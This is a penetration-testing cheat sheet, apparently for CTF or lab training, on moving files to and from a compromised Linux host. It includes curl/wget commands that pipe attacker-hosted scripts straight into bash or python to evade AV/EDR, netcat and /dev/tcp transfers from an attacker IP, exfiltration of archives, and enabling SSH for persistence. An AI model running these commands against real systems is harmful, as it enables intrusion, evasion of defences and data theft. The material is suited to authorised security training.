# File Transfer (Linux)
**Context:** You have shell access to a Linux machine. You need to download enumeration scripts (`linpeas.sh`), upload exploits, or exfiltrate data. 
**Constraint:** `wget` and `curl` might be missing or monitored. You need backups.
## 1. Web Downloads (HTTP/HTTPS)
**The Standard:** Use these first. They are reliable and support SSL.
### Wget & Curl
```shell
# Wget
# -O: Output file
wget https://10.10.14.5/linpeas.sh -O /tmp/linpeas.sh

# Curl
# -o: Output file
curl -o /tmp/linpeas.sh https://10.10.14.5/linpeas.sh
```
### Fileless Execution (Memory Only)
**Technique:** Pipe the download directly into `bash` or `python`. The file never touches the disk, bypassing some AV/EDR file scanning.
```shell
# Bash Script (Execute immediately)
curl https://10.10.14.5/linpeas.sh | bash

# Python Script
wget -qO- https://10.10.14.5/exploit.py | python3
```
## 2. Netcat & Ncat Transfers
**Scenario:** HTTP is blocked, or you need raw socket transfer. 
**Note:** `ncat` (Nmap's version) is modern and supports encryption/IPv6. `nc` (OpenBSD/GNU) is legacy.
### Method A: Victim Pulls from Attacker (Preferred)
**Scenario:** Attacker hosts the file, Victim connects to download it. Good for bypassing inbound firewalls on the victim.

**1. Attacker (Sender):**
```shell
# Listen on Port 443 and serve file
# -q 0: Quit 0 seconds after EOF (Critical for closing connection)
sudo nc -l -p 443 -q 0 < exploit.sh

# Ncat alternative
sudo ncat -l -p 443 --send-only < exploit.sh
```

**2. Victim (Receiver):**
```shell
# Connect to Attacker and write to file
nc 10.10.14.5 443 > exploit.sh

# Ncat alternative
ncat 10.10.14.5 443 --recv-only > exploit.sh
```
### Method B: Attacker Pushes to Victim
**Scenario:** Victim listens, Attacker connects. Only works if Victim has **inbound ports open**.

**1. Victim (Receiver):**
```shell
# Listen on Port 8000 and wait for data
nc -l -p 8000 > exfiltrated_data.tar.gz
```

**2. Attacker (Sender):**
```shell
# Connect and send file
nc -q 0 <VICTIM_IP> 8000 < local_file.tar.gz
```
## 3. Bash Built-in (/dev/tcp)

**Scenario:** `nc`, `wget`, `curl` are ALL removed. But you have `bash`. 
**Technique:** Bash handles TCP connections natively as files.
```shell
# 1. Connect to Attacker's Listener (e.g., nc -l -p 443 < file)
# 2. Redirect stream to a file
cat < /dev/tcp/10.10.14.5/443 > /tmp/dropped_file
```
## 4. SSH Transfers (SCP)
**Scenario:** You have valid SSH credentials. This is the most secure and reliable method.
```shell
# Download (Remote -> Local)
# Syntax: scp user@target:/path local_destination
scp student@10.129.2.15:/tmp/passwd.bak .

# Upload (Local -> Remote)
# Syntax: scp local_file user@target:/path
scp linpeas.sh student@10.129.2.15:/dev/shm/
```
### Enabling SSH Server (Persistence)
**Context:** If you are root, enable SSH to maintain access.
```shell
sudo systemctl enable ssh
sudo systemctl start ssh
```
## 5. Python Utilities (Post-Transfer)
**Context:** You uploaded a `.zip` because it was faster, but the target lacks `unzip`.
```shell
# One-liner to unzip a file using Python's standard library
python3 -c "import zipfile; zipfile.ZipFile('upload.zip', 'r').extractall()"
```